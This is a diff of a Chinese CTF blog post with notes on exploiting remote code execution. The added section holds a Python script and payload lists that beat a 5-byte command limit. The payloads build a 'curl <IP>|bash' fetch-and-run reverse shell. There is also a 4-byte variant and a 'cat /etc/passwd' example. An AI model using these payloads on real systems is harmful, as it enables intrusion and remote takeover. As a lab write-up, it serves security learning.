@@ -7,7 +7,7 @@
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://znnnnnh2.icu/img/butterfly-icon.png">
 <meta property="article:published_time" content="2025-10-02T07:38:40.000Z">
-<meta property="article:modified_time" content="2025-10-16T06:27:17.722Z">
+<meta property="article:modified_time" content="2025-10-17T06:32:56.458Z">
 <meta property="article:author" content="ZnnnnnH2">
 <meta property="article:tag" content="RCE">
 <meta name="twitter:card" content="summary">
@@ -18,7 +18,7 @@
   "url": "https://znnnnnh2.icu/2025/10/02/RCE%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/",
   "image": "https://znnnnnh2.icu/img/butterfly-icon.png",
   "datePublished": "2025-10-02T07:38:40.000Z",
-  "dateModified": "2025-10-16T06:27:17.722Z",
+  "dateModified": "2025-10-17T06:32:56.458Z",
   "author": [
     {
       "@type": "Person",
@@ -159,7 +159,7 @@
   isHighlightShrink: false,
   isToc: true,
   pageType: 'post'
-}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">ZnnnnnH2 小屋</span></a><a class="nav-page-title" href="/"><span class="site-name">RCE远程代码执行漏洞学习笔记</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"></div></nav><div id="post-info"><h1 class="post-title">RCE远程代码执行漏洞学习笔记</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-10-02T07:38:40.000Z" title="发表于 2025-10-02 15:38:40">2025-10-02</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-10-16T06:27:17.722Z" title="更新于 2025-10-16 14:27:17">2025-10-16</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/ctf/">ctf</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h1><h2 id="简析"><a href="#简析" class="headerlink" title="简析"></a>简析</h2><p>RCE（Remote Code Execution，远程代码执行）是一种安全漏洞，允许攻击者在目标系统上执行任意代码。</p>
+}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">ZnnnnnH2 小屋</span></a><a class="nav-page-title" href="/"><span class="site-name">RCE远程代码执行漏洞学习笔记</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"></div></nav><div id="post-info"><h1 class="post-title">RCE远程代码执行漏洞学习笔记</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-10-02T07:38:40.000Z" title="发表于 2025-10-02 15:38:40">2025-10-02</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-10-17T06:32:56.458Z" title="更新于 2025-10-17 14:32:56">2025-10-17</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/ctf/">ctf</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h1><h2 id="简析"><a href="#简析" class="headerlink" title="简析"></a>简析</h2><p>RCE（Remote Code Execution，远程代码执行）是一种安全漏洞，允许攻击者在目标系统上执行任意代码。</p>
 <h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="NewStar2023-R-C-E"><a href="#NewStar2023-R-C-E" class="headerlink" title="NewStar2023 R!C!E"></a>NewStar2023 R!C!E</h3><h3 id="ctfHub-RCE-eval-执行"><a href="#ctfHub-RCE-eval-执行" class="headerlink" title="ctfHub-RCE-eval 执行"></a>ctfHub-RCE-eval 执行</h3><ul>
 <li><code>exec()</code> 执行”系统命令”</li>
 <li><code>eval()</code> 执行”PHP 代码”</li>
@@ -311,18 +311,60 @@
 <p>解答同上</p>
 <h4 id="lab14-7-字节"><a href="#lab14-7-字节" class="headerlink" title="lab14-7 字节"></a>lab14-7 字节</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /f\*</span><br></pre></td></tr></table></figure>
 
-<h4 id="lab15-5-字节"><a href="#lab15-5-字节" class="headerlink" title="lab15-5 字节"></a>lab15-5 字节</h4><p>反弹 shell</p>
+<h4 id="lab15-5-字节"><a href="#lab15-5-字节" class="headerlink" title="lab15-5 字节"></a>lab15-5 字节</h4><p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzkzNDYwOTM1Nw==&mid=2247483838&idx=1&sn=307ceadf62e0f8c5d8fcde9dd0fc7d1b&chksm=c2bbe91cf5cc600a6acdd1faed9f707c4f91f8489792d877eb4658e8a5a979019d6c1c5a87fe&cur_album_id=3900985574500286472&scene=189#wechat_redirect">blog1</a></p>
 <ol>
-<li>命令拆分为小于字符限制的小块用<code>\</code>链接<ol>
+<li>将命令拆分为小于字符限制的小块用<code>\</code>链接<ol>
 <li>因为要使用<code>sh -t</code>，所以要倒序处理命令</li>
-<li>中的特殊字符转义</li>
+<li>命令中的特殊字符需要转义</li>
 </ol>
 </li>
 <li>将命令作为文件名</li>
-<li>使用 ls -t 再把文件名写入一整个文件</li>
-<li>再使用 sh a 执行该文件</li>
+<li>使用 ls -t 再把文件名写入一整个文件<ol>
+<li>但 ls -t&gt;a 也超出限制，所以要拆分</li>
+<li>这次使用字典序，通过写入两次连接首位（这玩意到底是谁研究的）</li>
 </ol>
-<h4 id="lab16-4-字节"><a href="#lab16-4-字节" class="headerlink" title="lab16-4 字节"></a>lab16-4 字节</h4><p>同上</p>
+</li>
+<li>再使用 sh b sh a 执行该文件</li>
+</ol>
+<p>反弹 shell</p>
+<p>wp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">TIME = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://localhost:8080/&quot;</span></span><br><span class="line"></span><br><span class="line">r = requests.get(url+<span class="string">&quot;?reset=1&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;payload1.txt&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    payload = f.read()</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> payload.split(<span class="string">&quot;\n&quot;</span>):</span><br><span class="line">        <span class="keyword">if</span> line.strip():</span><br><span class="line">            r = requests.get(url + <span class="string">&quot;?cmd=&quot;</span> + quote(line.strip()))</span><br><span class="line">            time.sleep(TIME)</span><br><span class="line">            <span class="built_in">print</span>(r.status_code)</span><br><span class="line">            <span class="built_in">print</span>(r.text)</span><br><span class="line">            <span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;payload2.txt&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    payload = f.read()</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> payload.split(<span class="string">&quot;\n&quot;</span>):</span><br><span class="line">        <span class="keyword">if</span> line.strip():</span><br><span class="line">            r = requests.get(url + <span class="string">&quot;?cmd=&quot;</span> + quote(line.strip()))</span><br><span class="line">            time.sleep(TIME)</span><br><span class="line">            <span class="built_in">print</span>(r.status_code)</span><br><span class="line">            <span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br><span class="line">r = requests.get(url+<span class="string">&quot;?cmd=&quot;</span>+quote(<span class="string">&quot;sh b&quot;</span>))</span><br><span class="line"><span class="built_in">print</span>(r.status_code)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line">time.sleep(<span class="number">0.5</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;=&quot;</span>*<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">r = requests.get(url+<span class="string">&quot;?cmd=&quot;</span>+quote(<span class="string">&quot;sh a&quot;</span>))</span><br><span class="line"><span class="built_in">print</span>(r.status_code)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>
+
+<p>payload1</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;\ \</span><br><span class="line">&gt;-t\</span><br><span class="line">&gt;\&gt;a</span><br><span class="line">&gt;ls\</span><br><span class="line">ls&gt;b</span><br><span class="line">ls&gt;&gt;b</span><br></pre></td></tr></table></figure>
+
+<p>payload2</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&gt;bash</span><br><span class="line">&gt;5\|\</span><br><span class="line">&gt;19\</span><br><span class="line">&gt;4.\</span><br><span class="line">&gt;7.5\</span><br><span class="line">&gt;5\</span><br><span class="line">&gt;23.\</span><br><span class="line">&gt;\ 1\</span><br><span class="line">&gt;url\</span><br><span class="line">&gt;c\</span><br></pre></td></tr></table></figure>
+
+<p>靶机中的文件</p>
+<p><img src="/83d00291ace7ff7aa63384bd95188337.png" alt="alt text"></p>
+<p>cat b</p>
+<p><img src="/99dd0d76a7e1e82ac86a31ff4fe0ef99.png" alt="alt text"></p>
+<p>cat a</p>
+<p><img src="/image-2.png" alt="alt text"></p>
+<p>槽点</p>
+<ul>
+<li>神网络延迟，因为 ls -t 依靠文件修改时间排序，而所以要手动 sleep 以下</li>
+<li>神秘靶机，自己建的 Docker 可以过，靶场过不了</li>
+</ul>
+<h4 id="lab16-4-字节"><a href="#lab16-4-字节" class="headerlink" title="lab16-4 字节"></a>lab16-4 字节</h4><p>尝试替换上文 ls&gt;&gt;b</p>
+<p>使用</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;dir</span><br><span class="line">&gt;g\&gt;</span><br><span class="line">&gt;ht-</span><br><span class="line">&gt;sl</span><br></pre></td></tr></table></figure>
+
+<p>此时文件按字典序排序为</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dir</span><br><span class="line">g\&gt;</span><br><span class="line">ht-</span><br><span class="line">sl</span><br></pre></td></tr></table></figure>
+
+<p>使用 <code>*&gt;v</code> 相当于执行 <code>dir g&gt; ht- sl &gt; v</code></p>
+<p>即将这三个文件的名字写入 v 中</p>
+<p><img src="/image-3.png" alt="alt text"></p>
+<p>使用 <code>&gt;rev</code></p>
+<p>创建名为 rev 的空文件</p>
+<p><code>*v&gt;x</code></p>
+<p>同时匹配文件 v 和 rev，执行命令 rev v&gt;x</p>
+<p>于是 x 中的内容</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -th &gt; g</span><br></pre></td></tr></table></figure>
+
+<p>将 rev 写入</p>
 <h4 id="lab17-PHP-命令执行函数"><a href="#lab17-PHP-命令执行函数" class="headerlink" title="lab17-PHP 命令执行函数"></a>lab17-PHP 命令执行函数</h4><ul>
 <li><p><code>system()</code> 函数用于在系统权限允许的情况下执行系统命令（Windows 和 Linux 系统均可执行）。<br>例：<code>system(&#39;cat /etc/passwd&#39;);</code></p>
 </li>
